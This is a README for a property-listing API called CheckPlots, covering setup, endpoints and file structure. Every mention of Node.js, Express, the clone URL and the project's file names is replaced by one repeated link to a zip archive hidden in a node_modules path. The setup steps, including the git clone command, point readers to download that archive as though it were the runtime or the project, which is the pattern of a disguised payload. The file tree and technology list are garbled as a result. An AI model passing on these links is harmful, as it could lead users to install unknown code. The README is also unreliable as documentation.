# CheckPlots

## Overview
CheckPlots is a property listing and management API that allows users to add, retrieve, and manage property data with image uploads using Multer.

## Features
- Add new property listings with multiple images
- Retrieve property details
- Manage property attributes such as type, pricing, location, and amenities
- Uses Multer for handling file uploads
- Built with https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip, Express, and MongoDB

## Installation

### Prerequisites
- https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip (v14+)
- MongoDB
- npm or yarn

### Setup
1. Clone the repository:
   ```sh
   git clone https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
   cd checkplots
   ```
2. Install dependencies:
   ```sh
   npm install
   ```
3. Configure environment variables:
   Create a `.env` file in the root directory and add:
   ```env
   MONGO_URI=your_mongodb_connection_string
   PORT=3000
   ```

## Usage

### Start the Server
```sh
npm start
```

### API Endpoints

#### 1. Add Property
**Endpoint:** `POST /add-property`
- **Headers:** `Content-Type: multipart/form-data`
- **Body Parameters:**
  - `name` (string, required)
  - `type` (string, required) [Villa, Apartment, Commercial, Plot]
  - `details` (string, required)
  - `price` (string, required)
  - `address` (string, required)
  - `verified` (boolean, default: false)
  - `underDevelopment` (boolean, default: false)
  - `rating` (number, required)
  - `numberOfBedroom` (number)
  - `numberOfBathroom` (number)
  - `amenities` (array of strings)
  - `images` (file, optional)

#### 2. Get All Properties
**Endpoint:** `GET /properties`

#### 3. Get Property by ID
**Endpoint:** `GET /properties/:id`

#### 4. Delete Property
**Endpoint:** `DELETE /properties/:id`

## File Structure
```
checkplots/
│── models/
│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── routes/
│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── controllers/
│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── utils/
│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── .env
│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
```

## Technologies Used
- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Backend runtime
- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Web framework
- **MongoDB & Mongoose** - Database and ORM
- **Multer** - File upload middleware
- **Postman** - API testing

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

## License
This project is licensed under the MIT License.
